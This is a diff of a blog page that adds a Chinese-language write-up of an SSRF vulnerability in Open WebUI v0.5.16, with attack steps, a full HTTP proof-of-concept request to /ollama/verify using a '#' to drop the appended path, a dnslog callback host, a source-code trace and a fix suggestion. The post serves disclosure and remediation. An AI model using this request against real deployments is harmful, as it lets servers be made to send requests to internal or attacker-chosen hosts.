@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="friends, Made by jcxj">
+    <meta name="keywords" content="open-webui_ssrf漏洞, Made by jcxj">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>friends | Made by jcxj</title>
+    <title>open-webui_ssrf漏洞 | Made by jcxj</title>
     <link rel="icon" type="image/png" href="/jcxj/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/jcxj/libs/awesome/css/all.css">
@@ -208,7 +208,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">friends</h1>
+                    <h1 class="description center-align post-title">open-webui_ssrf漏洞</h1>
                 </div>
             </div>
         </div>
@@ -336,28 +336,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-09-20
+                    2025-03-01
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2023-03-06
+                    2025-03-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    0
+                    555
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    1 Min
+                    2 Min
                 </div>
                 
 
@@ -380,7 +380,68 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="1-影响版本"><a href="#1-影响版本" class="headerlink" title="1.影响版本"></a>1.影响版本</h1><img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144310748.png" class="" title="image-20250301144310748">
+
+<p>版本：v0.5.16</p>
+<h1 id="2-攻击步骤"><a href="#2-攻击步骤" class="headerlink" title="2.攻击步骤"></a>2.攻击步骤</h1><p>访问 设置-外部链接-管理Ollama API连接</p>
+<img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144356272.png" class="" title="image-20250301144356272">
+
+<p>url填入：<a target="_blank" rel="noopener" href="http://2223.xdoko0gi.eyes.sh/?id=1&#39;">http://2223.xdoko0gi.eyes.sh/?id=1&#39;</a> or 1=1 – # 后点击右边的测试按钮</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;2223.xdoko0gi.eyes.sh&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 -- #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144933103.png" class="" title="image-20250301144933103">
+
+<p>查看dnslog平台的web日志，如下图，成功利用服务器发起了任意形式的GET请求攻击，验证了SSRF攻击存在</p>
+<img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301144959765.png" class="" title="image-20250301144959765">
+
+<p>POC如下</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;ollama&#x2F;verify HTTP&#x2F;1.1
+Host: localhost:8080
+Content-Length: 66
+sec-ch-ua: 
+Accept: application&#x2F;json
+Content-Type: application&#x2F;json
+sec-ch-ua-mobile: ?0
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmM2RmNzE5LWE0NGUtNDVkNC1hZGJkLWRiNWRhNmVjNzg4OSJ9.enDXNwjdUApgnnkE71G8eznz87KTQwRNQ9RKODnaSS4
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;116.0.5845.97 Safari&#x2F;537.36
+sec-ch-ua-platform: &quot;&quot;
+Origin: http:&#x2F;&#x2F;localhost:8080
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http:&#x2F;&#x2F;localhost:8080&#x2F;admin&#x2F;settings
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Cookie: token&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImRmM2RmNzE5LWE0NGUtNDVkNC1hZGJkLWRiNWRhNmVjNzg4OSJ9.enDXNwjdUApgnnkE71G8eznz87KTQwRNQ9RKODnaSS4
+Connection: close
+
+&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;2223.xdoko0gi.eyes.sh&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 -- #&quot;,&quot;key&quot;:&quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为什么要用 # 注释符？</p>
+<p>如下图所示，如果没用#则url会自动拼接上 /api/version, 可能会影响正常攻击payload（如sql注入攻击并不会用到/api/version）</p>
+<img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301151957826.png" class="" title="image-20250301151957826">
+
+
+
+<h1 id="3-源码跟踪"><a href="#3-源码跟踪" class="headerlink" title="3.源码跟踪"></a>3.源码跟踪</h1><p>漏洞原理：利用#注释符注释掉了默认添加在url后面的 /api/version,达到了SSRF漏洞</p>
+<p>如POC所示，程序向/ollama/verify发起了POST请求，请求参数为</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;2223.xdoko0gi.eyes.sh&#x2F;?id&#x3D;1&#39; or 1&#x3D;1 -- #&quot;,&quot;key&quot;:&quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301150939879.png" class="" title="image-20250301150939879">
+
+<p>根据 /ollama/verify路由可以找到处理该路径的函数</p>
+<img src="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/image-20250301151635154.png" class="" title="image-20250301151635154">
+
+<p>该函数位于 /routers/ollama/verify中,如 185、186行所示，该函数会从表单中获取名为url、key的参数值</p>
+<p>在193行，f”{url}/api/version”, 中，将用户输入的url直接拼接上 /api/version (此处可以用 # 进行绕过)</p>
+<pre class="line-numbers language-none"><code class="language-none">async with session.get(
+                f&quot;&#123;url&#125;&#x2F;api&#x2F;version&quot;,
+                headers&#x3D;&#123;**(&#123;&quot;Authorization&quot;: f&quot;Bearer &#123;key&#125;&quot;&#125; if key else &#123;&#125;)&#125;,
+            )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后将拼接好的url和headers发起get请求</p>
+<h1 id="4-修复建议"><a href="#4-修复建议" class="headerlink" title="4.修复建议"></a>4.修复建议</h1><p>在url拼接前，对用户的输入进行严格限制，如不允许输入特殊字符#</p>
+
                 
             </div>
             <hr/>
@@ -406,7 +467,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://jcxj.github.io/jcxj/jcxj/friends/index.html">https://jcxj.github.io/jcxj/jcxj/friends/index.html</a>
+                    <a href="https://jcxj.github.io/jcxj/jcxj/2025/03/01/open-webui-ssrf-lou-dong/">https://jcxj.github.io/jcxj/jcxj/2025/03/01/open-webui-ssrf-lou-dong/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -638,13 +699,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;Current
             </div>
             <div class="card">
-                <a href="/jcxj/friends/index.html">
+                <a href="/jcxj/2025/03/01/open-webui-ssrf-lou-dong/">
                     <div class="card-image">
                         
                         
-                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="friends">
+                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="open-webui_ssrf漏洞">
                         
-                        <span class="card-title">friends</span>
+                        <span class="card-title">open-webui_ssrf漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -655,7 +716,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-03-01
                             </span>
                         <span class="publish-author">
                             
@@ -673,16 +734,16 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="far fa-dot-circle"></i>
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/jcxj/friends/index.html">
+                <a href="/jcxj/2024/12/11/xin-hu-oa-shen-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/jcxj/medias/featureimages/19.jpg" class="responsive-img" alt="friends">
+                        <img src="/jcxj/medias/featureimages/3.jpg" class="responsive-img" alt="信呼oa审计">
                         
-                        <span class="card-title">friends</span>
+                        <span class="card-title">信呼oa审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -693,7 +754,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-12-11
                             </span>
                         <span class="publish-author">
                             
@@ -703,7 +764,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
